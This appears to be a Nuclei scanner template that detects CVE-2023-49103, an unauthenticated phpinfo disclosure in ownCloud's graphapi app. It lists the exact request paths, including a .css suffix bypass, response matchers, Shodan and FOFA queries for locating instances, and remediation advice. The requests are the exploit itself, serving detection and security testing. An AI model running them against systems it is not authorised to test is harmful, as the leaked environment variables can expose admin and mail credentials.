id: CVE-2023-49103

info:
  name: OwnCloud - Phpinfo Configuration
  author: ritikchaddha
  severity: high
  description: |
    An issue was discovered in ownCloud owncloud/graphapi 0.2.x before 0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php library that provides a URL. When this URL is accessed, it reveals the configuration details of the PHP environment (phpinfo). This information includes all the environment variables of the webserver. In containerized deployments, these environment variables may include sensitive data such as the ownCloud admin password, mail server credentials, and license key. Simply disabling the graphapi app does not eliminate the vulnerability. Additionally, phpinfo exposes various other potentially sensitive configuration details that could be exploited by an attacker to gather information about the system.
  impact: |
    Unauthenticated attackers can access phpinfo configuration details exposing sensitive credentials including admin passwords, mail server credentials, and license keys in containerized deployments.
  remediation: |
    Upgrade ownCloud graphapi to version 0.2.1 or 0.3.1 or later, and remove or secure the GetPhpInfo.php file.
  reference:
    - https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py
    - https://nvd.nist.gov/vuln/detail/CVE-2023-49103
    - https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/
    - https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/
    - https://attackerkb.com/topics/G9urDj4Cg2/cve-2023-49103
    - https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-49103
    cwe-id: CWE-200
    epss-score: 0.94329
    epss-percentile: 0.99951
    cpe: cpe:2.3:a:owncloud:graph_api:0.2.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: owncloud
    product: graph_api
    shodan-query:
      - title:"owncloud"
      - http.title:"owncloud"
    fofa-query: title="owncloud"
    google-query: intitle:"owncloud"
  tags: cve2023,cve,owncloud,phpinfo,config,kev,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css"
      - "{{BaseURL}}/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "PHP Extension"
          - "PHP Version"
          - "owncloud"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022012483510c91d0cd3278a35b29a9cf8a66848f02fb1f246ff01e4fdebd8dcea810221008a6e8edef7eecb5680ed65783ea3e3784a92f2ad6e5e799c4903ccc09fc1ae6b:922c64590222798bb761d5b6d8e72950